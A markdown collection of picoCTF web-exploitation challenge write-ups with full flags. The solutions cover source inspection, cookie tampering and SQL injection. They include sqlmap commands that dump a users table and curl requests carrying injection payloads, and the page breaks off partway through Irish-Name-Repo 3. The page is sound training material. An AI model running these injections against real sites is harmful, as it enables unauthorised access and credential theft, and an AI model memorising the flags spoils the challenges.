# [PicoCTF](./picoctf.md) PicoGym Web Exploitation

Web Exploitation entails the manipulation of websites and web hosted services using vulnerabilities in the interactive elements of a website.

## Contents

- [Useful References](#useful-references)
- [Insp3ct0r (2019)](#insp3ct0r) ✓
- [logon (2019)](#logon) ✓
- [where are the robots (2019)](#where-are-the-robots) ✓
- [dont-use-client-side (2019)](#dont-use-client-side) ✓
- [picobrowser (2019)](#picobrowser) ✓
- [Client-side-again (2019)](#client-side-again) ✓
- [Irish-Name-Repo 1 (2019)](#irish-name-repo-1) ✓
- [Irish-Name-Repo 2 (2019)](#irish-name-repo-2) ✓
- [Irish-Name-Repo 3 (2019)](#irish-name-repo-3) ✓
- [JaWT Scratchpad (2019)](#jawt-scratchpad) ✓
- [Java Script Kiddie (2019)](#java-script-kiddie) ✓
- [Java Script Kiddie 2 (2019)](#java-script-kiddie-2) ✓
- [Web Gauntlet (2020)](#web-gauntlet) ✓
- [GET aHEAD (2021)](#get-ahead) ✓
- [Cookies (2021)](#cookies) ✓
- [Scavenger Hunt (2021)](#scavenger-hunt) ✓
- [Some Assembly Required 1 (2021)](#some-assembly-required-1) ✓
- [More Cookies (2021)](#more-cookies) ✓
- [It is my Birthday (2021)](#it-is-my-birthday) ✓
- [Who are you? (2021)](#who-are-you) ✓
- [Some Assembly Required 2 (2021)](#some-assembly-required-2) ✓
- [Super Serial (2021)](#super-serial) ✓
- [Most Cookies (2021)](#most-cookies)
- [Some Assembly Required 3 (2021)](#some-assembly-required-3) ✓
- [Web Gauntlet 2 (2021)](#web-gauntlet-2)
- [Some Assembly Required 4 (2021)](#some-assembly-required-4)
- [X marks the spot (2021)](#x-marks-the-spot)
- [Web Gauntlet 3 (2021)](#web-gauntlet-3)
- [Bithug (2021)](#bithug)
- [login (2021)](#login) ✓
- [caas (2021)](#caas)
- [notepad (2021)](#notepad)


---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Useful References

| Link | Description |
|------|-------------|
| [robots exclusions file](https://en.wikipedia.org/wiki/Robots_exclusion_standard) | Robots Wikipedia page. |
| [web crawlers](https://en.wikipedia.org/wiki/Web_crawler). | Web Crawlers Wikipedia page. |
| [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) | SQL Injection Wikipedia page. |
| [beautifier.io](https://beautifier.io/) | Code formatting tool. |
| [user agent](https://en.wikipedia.org/wiki/User_agent) | User agent Wikipedia page. |
| [sqlmap](http://sqlmap.org/) | SQLMap homepage. |
| [SQLite v3](https://sqlite.org/version3.html) | SQLite v3 homepage. |
| [Nginx](https://www.nginx.com/) | Nginx homepage. |
| [sqlmap man](http://manpages.org/sqlmap) | SQLMap man page. |
| [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) | PBKDF2 Wikipedia page. |
| [SHA1](https://en.wikipedia.org/wiki/SHA-1) | SHA1 Wikipedia page. |
| [crackstation.net](https://crackstation.net/) | Reverse hash lookup site. |
| [SQL3i CS](http://atta.cked.me/home/sqlite3injectioncheatsheet) | SQLite 3 injection cheatsheet. |
| [libpng](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) | PNG Specifications. |
| [JSON Web Tokens](https://jwt.io/) | JWT homepage. |
| [PyJWT](https://pyjwt.readthedocs.io/en/stable/) | PyJWT library homepage. |
| [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) | John the Ripper homepage. |

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Insp3ct0r

- Author: zaratec/danny
- 50 Points

### Description

Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/9670/ ([link](https://jupiter.challenges.picoctf.org/problem/9670/)) or http://jupiter.challenges.picoctf.org:9670

### Hints

1. How do you inspect web code on a browser?
2. There's 3 parts

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and inspect the source code:

~~~html
<!doctype html>
<html>
  <head>
    <title>My First Website :)</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
	<h1>Inspect Me</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">How</button>
      
      <div id="tabintro" class="tabcontent">
	<h3>What</h3>
	<p>I made a website</p>
      </div>

      <div id="tababout" class="tabcontent">
	<h3>How</h3>
	<p>I used these to make this site: <br/>
	  HTML <br/>
	  CSS <br/>
	  JS (JavaScript)
	</p>
	<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
      </div>
      
    </div>
    
  </body>
</html>
~~~

This gives us the first part of the flag, "picoCTF{tru3_d3".  Inspecting the stylesheet, mycss.css, we can find the second part of the flag:

~~~css
div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: "Open Sans";
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
~~~

Our flag is now "picoCTF{tru3_d3t3ct1ve_0r_ju5t".  We can also view the javascript source, myjs.js:

~~~js
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?2e7b23e3} */
~~~

This gives us the final part of the flag.  Our flag is complete: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3}



</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## logon

- Author: bobson
- 100 points

### Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/44573/ ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

### Hints

1. Hmm it doesn't seem to check anyone's password, except for Joe's?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

For this challenge, we can inspect the source code:

~~~html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
      
      <div class="jumbotron">
        <p class="lead"></p>
        <div class="login-form">
            <form role="form" action="/login" method="post">
                <div class="form-group">
                    <input type="text" name="user" id="email" class="form-control input-lg" placeholder="Username">
                </div>
                <div class="form-group">
                    <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password">
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <input type="submit" class="btn btn-lg btn-success btn-block" value="Sign In">
                </div>
            </div>
        </form>
    </div>
    <footer class="footer">
        <p>&copy; PicoCTF 2019</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
~~~

We can login using any account.  The website does not seem to authenticate login details.  After logging in we get the response:

~~~
Success: You logged in! Not sure you'll be able to see the flag though. 
~~~

and:

~~~
No flag for you
~~~

We can look at the cookies used for this site and see an admin cookie is set to False.

~~~
admin:"False"
~~~

We can change this cookie to True and reload the website.  We are now given the flag picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## where are the robots

- Author: zaratec/Danny
- 100 points

### Description

Can you find the robots? https://jupiter.challenges.picoctf.org/problem/56830/ ([link](https://jupiter.challenges.picoctf.org/problem/56830/)) or http://jupiter.challenges.picoctf.org:56830

### Hints

1. What part of the website could tell you where the creator doesn't want you to look?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge hints that the solution involves inspecting the [robots exclusions file](https://en.wikipedia.org/wiki/Robots_exclusion_standard).  This is a text file that specifies which components of the website should not be processed or scanned by [web crawlers](https://en.wikipedia.org/wiki/Web_crawler).

We can view the robots text file by entering "robots.txt" in the subdirectory.  The robots .txt file gives us:

~~~
User-agent: *
Disallow: /1bb4c.html
~~~

We can access this website and the following is displayed in the webpage:

~~~
Guess you found the robots
picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}
~~~

This gives us the flag picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## dont-use-client-side

- Author: Alex Fulton/Danny
- 100 points

### Description

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/17682/ ([link](https://jupiter.challenges.picoctf.org/problem/17682/)) or http://jupiter.challenges.picoctf.org:17682

### Hints

1. Never trust the client

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can inspect the html source for this website:

~~~html
<html>
<head>
<title>Secure Login Portal</title>
</head>
<body bgcolor=blue>
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '706c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_b') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '5}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:yellow">
<div style="text-align:center">
<p>This is the secure login portal</p>
<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>
~~~

We can see the password is authenticated in an inline javascript in the page.  We can reconstruct the password and retrieve the flag picoCTF{no_clients_plz_b706c5}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{no_clients_plz_b706c5}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## picobrowser

- Author: Archit
- 200 points

### Description

This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/28921/ ([link](https://jupiter.challenges.picoctf.org/problem/28921/)) or http://jupiter.challenges.picoctf.org:28921

### Hints

1. You don't need to download a new web browser.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

When connecting to a website, the [user agent](https://en.wikipedia.org/wiki/User_agent) is passed to the web server to adapt a website for optimisation to the clients browser.

This challenge suggests the flag is only available to picobrowser.  We therefore have to access the website whilst using a bespoke user agent "picobrowser".

We can inspect the website to locate the flag at https://jupiter.challenges.picoctf.org/problem/28921/flag and use curl to retrieve the flag:

~~~shell
$ curl -A "picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag | grep pico
~~~

This returns:

~~~shell
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  2115  100  2115    0     0   2627      0 --:--:-- --:--:-- --:--:--  2627
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}</code></p>
~~~

This gives us the flag picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Client-side-again

- Author: Danny
- 200 points

### Description

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/60786/ ([link](https://jupiter.challenges.picoctf.org/problem/60786/)) or http://jupiter.challenges.picoctf.org:60786

### Hints

1. What is obfuscation?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can inspect the website source again:

~~~html
<html>
<head>
<title>Secure Login Portal V2.0</title>
</head>
<body background="barbed_wire.jpeg" >
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  var _0x5a46=['f49bf}','_again_e','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray">
<div style="text-align:center">
<p>New and Improved Login</p>

<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>
~~~

There is an inline javascript code that authenticates the password.  We can use [beautifier.io](https://beautifier.io/) to format the javascript:

~~~js
(function(_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function(_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822['push'](_0x4bd822['shift']());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function(_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};

function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
~~~

This can be deconstructed to reveal the flag picoCTF{not_this_again_ef49bf}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{not_this_again_ef49bf}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 1

- Author: Chris Hensler
- 300 points

### Description

There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

### Hints

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge presents a webpage with a login subpage, login.html.  This webpage has a form to submit username and password details for login as site administrator.

The hints suggest that there is a backend database so this website is likely exploitable using SQL injection.

We can use [sqlmap](http://sqlmap.org/) to identify the database type and data fields:

~~~shell
$ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
~~~

We pass the url using the "-u" flag.  "--forms" tells sqlmap that the SQL database is accessed via a html form and --batch automate the user inputs to allow sqlmap to run autonomously.  "-f" tells sqlmap to perform an extensive DBMS version fingerprint.

We get the following response:

~~~shell
         ___
       __H__                                                                 
 ___ ___[)]_____ ___ ___  {1.5.2#stable}                                     
|_ -| . [(]     | .'| . |                                                    
|___|_  [.]_|_|_|__,|  _|                                                    
      |_|V...       |_|   http://sqlmap.org                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:34:11 /2021-03-13/

[10:34:11] [INFO] testing connection to the target URL
got a 301 redirect to 'https://jupiter.challenges.picoctf.org/problem/39720/login.html'. Do you want to follow? [Y/n] Y
[10:34:12] [INFO] searching for forms
[#1] form:
POST https://jupiter.challenges.picoctf.org/problem/39720/login.php
POST data: username=&password=&debug=0
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&debug=0] (Warning: blank fields detected): username=&password=&debug=0
do you want to fill blank fields with random values? [Y/n] Y
[10:34:13] [INFO] using '/home/djm89uk/.local/share/sqlmap/output/results-03132021_1034am.csv' as the CSV results file in multiple targets mode           
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=cBuM' OR NOT 3901=3901-- zTuF&password=&debug=0

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=cBuM' OR 2049=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- RKpb&password=&debug=0
---
do you want to exploit this SQL injection? [Y/n] Y
[10:34:13] [INFO] testing SQLite
[10:34:14] [INFO] confirming SQLite
[10:34:14] [INFO] actively fingerprinting SQLite
[10:34:14] [INFO] the back-end DBMS is SQLite
web application technology: Nginx
back-end DBMS: active fingerprint: SQLite 3
[10:34:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/djm89uk/.local/share/sqlmap/output/results-03132021_1034am.csv'    
~~~

This response identifies the back-end database uses [SQLite 3](https://sqlite.org/version3.html):

~~~shell
back-end DBMS: active fingerprint: SQLite 3
~~~

and the web application uses [Nginx](https://www.nginx.com/):

~~~shell
web application technology: Nginx
~~~

Reviewing the [sqlmap man page](http://manpages.org/sqlmap), we can rerun the sqlmap with the flag --dbms=SQLite.  This forces the sqlmap detection techniques to use SQLite only and reduces the number of operations.  We can use a few further flags to expand our queries.  --threads=10 runs sqlmap with 10 multiple concurrent threads, --tables tells sqlmap to retrieve tables from the DB.  We also pass the flag --random-agent, this changes the HTTP User-Agent to a browser instead of sqlmap.

~~~shell
$ sqlmap --dbms=SQLite --forms --batch --tables --random-agent --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html" 
~~~

The response provides the following table users:

~~~shell
<current>
[1 table]
+-------+
| users |
+-------+
~~~

We now know that the DB has a users table, in which the login details are likely held.  We can rerun sqlmap with the flag -T users, to focus on the users table.  Adding --dump, tells sqlmap to grab all of the data from the table:

~~~shell
$ sqlmap --dbms=SQLite --forms --batch -T users --dump --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
~~~

We get the following response:

~~~shell
Database: <current>
Table: users
[1 entry]
+-------+-------+--------------------------------------------------------------------+
| name  | admin | password                                                           |
+-------+-------+--------------------------------------------------------------------+
| admin | 1     | pbkdf2:sha1:1000$bTY1abU0$5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde |
+-------+-------+--------------------------------------------------------------------+
~~~

We can see the table users, has 1 entry with name "admin", given binary value 1 for admin field and password "pbkdf2:sha1:1000$bTY1abU0$5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde".

The password string provides details on how the password is hashed.  [pbkdf2](https://en.wikipedia.org/wiki/PBKDF2) is Password-Based Key Derivation Function 2. [SHA1](https://en.wikipedia.org/wiki/SHA-1), Secure Hashing Algorithm 1. "1000$" is the number of iterations used when hashing, and "bTY1abU0$" is the salt:

| Parameter | Value |
|-----------|-------|
| Key Function | PBKDF2 |
| Hashing Algorithm | SHA1 |
| Iterations | 1000 |
| Salt (ASCII) | bTY1abU0 |
| Salt (Hex) | 6254593161625530 |
| Hashed Password (Hex) | 5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde |

We can attempt to identify the password using a hash reverse lookup tool such as [crackstation.net](https://crackstation.net/).  This does not provide an answer.

We can attempt direct [SQLite 3 injection](http://atta.cked.me/home/sqlite3injectioncheatsheet) using the same commands we used in the WebGauntlet challenge.

We can view the SQL query using curl:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=test&password=test&debug=1"
~~~

We get a response:

~~~shell
<pre>username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre><h1>Login failed.</h1>  
~~~

The SQL query is:

~~~sql
SELECT * FROM users WHERE name='test' AND password='test'
~~~

We know the username in the users table is admin, we can attempt a simple OR input into the password:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
~~~

We get the response:

~~~shell
<pre>username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p> 
~~~

This gives us the flag, picoCTF{s0m3_SQL_c218b685}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{s0m3_SQL_c218b685}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 2

- Author: Xingyang Pan
- 350 points

### Description

There is a website running at https://jupiter.challenges.picoctf.org/problem/52849/ ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

### Hints

1. The password is being filtered.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Using sqlmap, we can identify the DBMS:

~~~shell
$ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/52849/login.html"
~~~

This does not return any details of the DBMS.  We therefore cannot identify the tables or records held in the db.

Assuming a similar users table used in the previous challenge, we can test the website with curl:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=test&password=test&debug=1"
<pre>username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre><h1>Login failed.</h1>     
~~~

We get the SQL query:

~~~sql
SELECT * FROM users WHERE name='test' AND password='test'
~~~

Attempting an OR statement on the password as in the previous challenge we get:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
<pre>username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
</pre><h1>SQLi detected.</h1>     
~~~

We can see SQLite is used. However we were unable to get in with the OR statement. We can try again, by entering a comment string into the username field:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin'--&password=test&debug=1"
<pre>username: admin'--
password: test
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='test'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>                                          
~~~

We get the flag picoCTF{m0R3_SQL_plz_fa983901}.


</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{m0R3_SQL_plz_fa983901}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 3

- Author: Xingyang Pan
- 400 points

### Description

There is a secure website running at https://jupiter.challenges.picoctf.org/problem/29132/ ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

### Hints

1. Seems like the password is encrypted.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This is another SQL injection challenge.  Inspecting the login html page:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.html"
~~~

We get the html webpage:

~~~html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
~~~

We can see the POST fields only pass the field "password" for aithentication in the SQL database.  We can query the login.php page:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=test&debug=1"
<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1> 
~~~

We can see the SQL query:

~~~sql
SELECT * FROM admin where password = 'grfg'
~~~

Attempting an OR injection, we cannot login:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' OR 1=1--&debug=1" 
<pre>password: ' OR 1=1--
SQL query: SELECT * FROM admin where password = '' BE 1=1--'
</pre>   
~~~

We can see the OR statement is replaced with BE but the integers and punctuation characters are unchanged.  This looks like a substitution cipher.  We can clarify the substitution with a long input:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&debug=1" 
<pre>password: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
</pre><h1>Login failed.</h1>      
~~~

We can see letter inputs are changed by 13, which is reflective (A=N, N=A).  Taking this substituted alphabet as an input we should get a normal alphabet returned:

~~~shell
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&debug=1"
<pre>password: NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm
SQL query: SELECT * FROM admin where password = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
